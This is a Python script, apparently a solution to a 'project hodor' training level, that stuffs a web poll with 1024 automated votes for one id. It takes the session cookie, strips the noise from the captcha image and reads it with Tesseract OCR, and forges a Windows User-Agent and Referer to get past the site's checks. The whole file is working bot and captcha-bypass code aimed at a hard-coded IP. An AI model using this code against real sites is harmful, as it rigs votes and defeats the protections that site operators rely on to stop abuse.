#!/usr/bin/python3
import requests
import pytesseract
import PIL
from PIL import ImageFilter
"""level_5 module

    Votes 1024 times (hopefully) for id 2529 on level_5 of project hodor
    Voting requires to send the value from a cookie to work
    AND voting needs to come from a Windows machine
    AND voting needs solving an harder, 8 alphanumeric chars obfuscated captcha
    """

# Target URL
url = "http://158.69.76.135/level5.php"

failed = 0
success = 0
total = 1024

# Start a session
session = requests.Session()


def deobfuscate(img_file, limit=10):
    """Switches every black pixel to 50% grey bg color"""
    # Open image file
    img = PIL.Image.open(img_file)
    img = img.convert('RGB')
    # Load as bitmap
    pixel_data = img.load()

    # Check value of each pixel, turn to #808080 if under #101010
    for x in range(img.size[0]):
        for y in range(img.size[1]):
            if (pixel_data[x, y][0] < limit) \
                    and (pixel_data[x, y][1] < limit) \
                    and (pixel_data[x, y][2] < limit):
                pixel_data[x, y] = (128, 128, 128, 255)
    img.show()
    img.save('deobfuscated.png')


# Loop and pray
for i in range(total):
    # Request the form page and fetch the cookie
    res = session.get(url)
    dict = session.cookies.get_dict()

    # Download the captcha image
    image = session.get('http://158.69.76.135/tim.php')
    # Write the content of the image to temp.png
    file = open("temp.png", "wb")
    file.write(image.content)
    file.close()
    # Deobfuscate image
    deobfuscate('temp.png')

    # Add character whitelist to limit false positives
    custom = '-c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz'
    # Run the processed image through Tesseract's OCR
    captcha = pytesseract.image_to_string(PIL.Image.open('deobfuscated.png'),
                                          config=custom)

    # Modify User-Agent with a Windows signature
    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
               AppleWebKit/537.36 (KHTML, like Gecko) \
               Chrome/87.0.4280.88 Safari/537.36",
               'Referer': url}

    # Prepare payload of the POST request
    data = {'id': 2529,
            'key': dict['HoldTheDoor'],
            'captcha': captcha[0:8],
            'holdthedoor': 'Envoyer'}

    # Lick the stamp and SEND IT
    post = session.post(url, data=data, headers=headers)

    # Print stuff after each request
    print("Request #{:d}".format(i), end=' ')
    print("Key: {:s}".format(dict['HoldTheDoor']), end=' ')
    print("Captcha: {:s}".format(captcha[0:8]), end=' ')
    if post and "hacker" not in post.text:
        print("Request success")
        success += 1
    else:
        print("Request fail")
        failed += 1
    # Clear session cookies
    session.cookies.clear()

# Print stuff after all requests are done
print("{:d} requests sent".format(total))
print("{:d} requests succeded".format(success))
print("{:d} requests failed".format(failed))
